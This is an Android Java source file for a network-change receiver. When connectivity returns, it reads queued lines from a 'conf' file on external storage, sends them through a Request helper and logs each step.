package com.inet.android.bs;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.Environment;
import android.util.Log;

public class NetworkChangeReceiver extends BroadcastReceiver {
	File outFile;
	File tmpFile;
	String str;
	BufferedReader fin;
	BufferedWriter fout;
	SharedPreferences sp;
	public static final String LOG_TAG = "NetworkChangeReciever";

	@Override
	public void onReceive(final Context context, final Intent intent) {
		final ConnectivityManager connMgr = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);

		final android.net.NetworkInfo wifi = connMgr
				.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

		final android.net.NetworkInfo mobile = connMgr
				.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
		Request req = new Request(context);
		StringBuilder sendStrings = new StringBuilder(); // Using default 16
														// character size
		String funcRecStr = null;
		Log.d(LOG_TAG, "begin");
		FileLog.writeLog("NetWorkChangeReciver -> begin");
	
		if (wifi.isAvailable() || mobile.isConnectedOrConnecting()) {
			Log.d(LOG_TAG, "available");
			FileLog.writeLog("NetWorkChangeReciver -> available");
		
			outFile = new File(Environment.getExternalStorageDirectory(),
					"/conf");
			if (outFile.exists() == false) {
				Log.d(LOG_TAG, "outfile not exist");
				FileLog.writeLog("NetWorkChangeReciver -> outfile not exist");

				return;
			}
			if (outFile.length() == 0) {
				Log.d(LOG_TAG, "outfile is empty");
				FileLog.writeLog("NetWorkChangeReciver -> outfile is empty");
				
				return;
			}
			tmpFile = new File(Environment.getExternalStorageDirectory(),
					"/tmpSendFile.txt");

			try {
				fin = new BufferedReader(new InputStreamReader(
						new FileInputStream(outFile)));
				try {
					fout = new BufferedWriter(new FileWriter(tmpFile));
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();

				}
			} catch (FileNotFoundException e) {
				// TODO Автоматически созданный блок catch
				e.printStackTrace();
				return;
			}
			try {
				String lineToRemove = null;
				while ((str = fin.readLine()) != null) {
					Log.d(LOG_TAG, "send string: " + str);
					FileLog.writeLog("NetworkChangeReciver -> send string: " + str);
					
					if (str.length() >= 6 && str.substring(0, 6).equals("<func>")) {
						funcRecStr = str;
						
						Log.d(LOG_TAG, "funcRecStr: " + str);
						FileLog.writeLog("NetworkChangeReciver -> funcRecStr: " + str);
					} else {
						sendStrings.append(str);
					}
					lineToRemove = str;
					String trimmedLine = str.trim();
					if (trimmedLine.equals(lineToRemove))
						continue;
					fout.write(str);

				}
				if (funcRecStr != null) {
					req.sendFirstRequest(funcRecStr);
					
					Log.d(LOG_TAG, "send funcRecStr: " + funcRecStr);
					FileLog.writeLog("NetworkChangeReciver -> send funcRecStr: " + funcRecStr);
				}
				
				req.sendRequest(sendStrings.toString());
				
				Log.d(LOG_TAG, "send data strings: " + sendStrings.toString());
				FileLog.writeLog("NetworkChangeReciver -> send data strings: " + sendStrings.toString());
			
				boolean successful = tmpFile.renameTo(outFile);

				Log.d(LOG_TAG,
						"Rename file:" + Boolean.toString(successful));
				FileLog.writeLog("NetworkChangeReciver -> Rename file:"
						+ Boolean.toString(successful));
			} catch (IOException e) {
				// TODO Автоматически созданный блок catch
				e.printStackTrace();
				return;
			}
			try {
				fin.close();
				fout.close();
			} catch (IOException e) {
				// TODO Автоматически созданный блок catch
				e.printStackTrace();
			}
		} else {
			Log.d(LOG_TAG, " network available: печалька");
			FileLog.writeLog("NetworkChangeReciver -> network available: печалька");
		}
		
		Log.d(LOG_TAG, "end");
		FileLog.writeLog("NetworkChangeReciver -> end");
	}

}
